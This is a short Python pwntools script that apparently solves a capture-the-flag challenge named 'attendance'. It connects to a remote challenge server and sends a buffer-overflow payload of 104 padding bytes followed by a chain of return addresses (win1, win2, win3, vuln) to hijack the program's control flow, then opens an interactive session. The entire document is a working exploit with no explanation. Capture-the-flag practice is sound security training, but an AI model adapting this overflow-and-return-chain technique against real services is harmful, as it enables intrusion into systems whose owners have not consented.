from pwn import *

context.binary = './attendance'
context.log_level = 'debug'

#r = process('./attendance')
r = remote('chal.firebird.sh',35029)
#Chain  : win1 + win2 + win3 + vuln


offset = 104
win1 = p64(0x401162)
win2 = p64(0x40117f)
win3 = p64(0x40119c)
vuln = p64(0x4011b9)

payload = b'A' * offset + win1 + win2 + win3 + vuln

r.recvuntil(b'!\n\n')
r.sendline(payload)
r.interactive()